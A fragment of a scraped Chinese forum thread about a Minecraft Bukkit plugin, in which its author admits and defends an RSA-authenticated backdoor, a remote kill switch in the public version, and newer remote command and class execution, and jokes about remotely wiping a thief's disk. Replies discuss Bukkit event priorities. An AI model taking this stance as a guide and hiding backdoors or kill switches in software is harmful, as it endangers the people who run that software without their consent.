            "txt_content": " 本帖最后由 wujinze 于 2019-9-14 12:28 编辑 \n\n您好，这里插件作者\n此插件是我私人及提供给fsclan服务器使用的插件，后门目的为防止插件盗窃\n此插件并非由我发布于mcbbs上，而是在2018年初遭到domcer服务器盗窃后其管理未经我允许发布的\n我曾经举报过发布贴(https://www.mcbbs.net/forum.php?mod=viewthread&tid=842258)并于举报贴提醒过插件含有后门\n但并未得到处理\n(这盗窃帖子终于被解决了，喜大普奔\n---------------\n安装有此插件的服务器无需过于恐慌\n插件通过rsa加密算法进行认证，私钥只有我有\n我没有在盗窃我插件的domcer以外的服务器激活此后门的想法与兴趣\n删除插件就行了，如果想要没有后门的搭路插件可以去我的github下载公开版\n我事先声明github的公开版插件内有一个允许我远程停止全网所有插件的使用的接口，在发现插件被某些服务器恶意修改(如抹去版权)等情况下可能会启用(但也可能不启用，毕竟我已经差不多养老了=w=\n---------------\n解释几个楼上没明白啥意思功能吧\n发送系统时间: 时间戳同步，为防止数据包重放来绕过rsa加密认证，认证过程中会进行时间戳匹配\ncoreinjector: 通过代理bukkit命令处理方法的方式进行正则表达式命令屏蔽与替换，开发这个功能主要是当时fsclan的管理稀饭经常sudo我发一些女装之类的话，用这玩意让他全都sudo他自己((((\n.\n其余功能均为防止插件盗窃及在发生盗窃时可以采取措施而设计(其实这是个旧版本，新版本还有远程cmd和远程执行class的功能\n(domcer要是盗的我新版本就好了，直接给他硬盘远程格了就没有这么多事情了"
        },
        {
            "author": "SakuraKooi",
            "timestamp": 1568431200,
            "txt_content": "@云闪\npublic static final EventPriority MONITOR\nEvent is listened to purely for monitoring the outcome of an event.\nmonitor优先级是用于监听事件的最终结果，应该是最后执行的，如果有误请指正"
        },
        {
            "author": "云闪",
            "timestamp": 1568432880,
            "txt_content": "wujinze 发表于 2019-9-14 11:20\n@云闪\npublic static final EventPriority MONITOR\nEvent is listened to purely for monitoring the outco ...\n我说的是HIGHEST，他执行之后紧接着就轮到MONITOR了。如果是希望其他插件看不到命令的话，MONITOR在最后恢复没有问题，但是你得在LOWEST也就是最开始就屏蔽"
        },
        {
            "author": "利姆露酱",
            "timestamp": 1568444940,
            "txt_content": "来晚了？"
        },
        {
            "author": "利姆露酱",
            "timestamp": 1568445180,
            "txt_content": "wujinze 发表于 2019-9-14 09:31\n您好，这里插件作者\n此插件是我私人及提供给fsclan服务器使用的插件，后门目的为防止插件盗窃\n此插件并非由 ...\n这插件是雪狼发的"
        }
    ]
}